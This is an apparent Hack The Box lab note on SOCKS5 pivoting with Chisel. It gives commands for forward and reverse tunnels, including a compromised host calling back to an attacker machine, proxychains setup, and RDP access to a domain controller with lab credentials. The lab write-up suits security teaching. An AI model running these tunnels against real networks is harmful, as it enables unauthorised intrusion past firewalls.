---
title: SOCKS5 - Chisel
draft: false
tags:
  - chisel
---
**Chisel** - Written in Go. TCP/UDP based tunneling tool. Secured using SSH. Can create a client-server tunnel connection in a firewall restricted environment. 

Scenario:

Attacker -> Ubuntu -> DC(172.16.5.19)

## Installation

```shell-session
jadu101@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

```shell-session
jadu101@htb[/htb]$ cd chisel
go build
```


## Chisel Server

After transferring Chisel server to ubuntu machine, let;s start the server session:

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

Chisel listener will listen for incoming connections on port 1234 using SOCKS5 and forward it to all the networks that are accessible from the pivothost.

## Chisel Client

Now on our attacker machine, let's start chisel client:

```shell-session
jadu101@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

Chisel client has created tunnel between chisel server and client and now is listening on port 1080. 

## Proxychains

Modify `/etc/proxychains.conf` and add 1080 port at the end. 

```shell-session
jadu101@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

## Pivoting to DC

Now we can access DC network which is two network hops away from the attacker machine:

```shell-session
jadu101@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot

Earlier, we used Ubuntu server as Chisel server.

There are scenarios where firewall rules restrict inbound connections to our compromised target. If this is the case, we use Chisel with the reverse option. 

`--reverse`: The server will listen and accept connections and they will be proxed through the client. 

### Chisel Server

Let's start Chisel server on attacker host:

```shell-session
jadu101@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

### Chisel Client

Now, we will connect from Ubuntu PivotHost to our attacker host:

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```
### Proxychains

```shell-session
jadu101@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

Now we can access DC network:

```shell-session
jadu101@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel - Cheatsheet

There are many ways for tunneling but my favorite way is **chisel**.

[Here](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)is a good chisel cheatsheet created by 0xdf. 

Let's say you are on the compromised system and you found 192.168.122.4 host live and connected to your compromised system. It has port 80 open so I would have to tunnel to access that port 80 running on 192.168.122.4.

1. You first upload **chisel** to the compromised system using wget or curl.

![](https://i.imgur.com/bw7gY2r.png)

2. Now on your local machine, start Chisel server listening on whatever port you prefer (In this case 9000).

![](https://i.imgur.com/8uPSoY6.png)

3. Now on the compromised system, tunnel target machine's port to local machine's listener.

![](https://i.imgur.com/cOCJDW7.png)

4. Now on your local machine, you can access port 80 of 192.168.122.4 as if you are accessing service running locally. 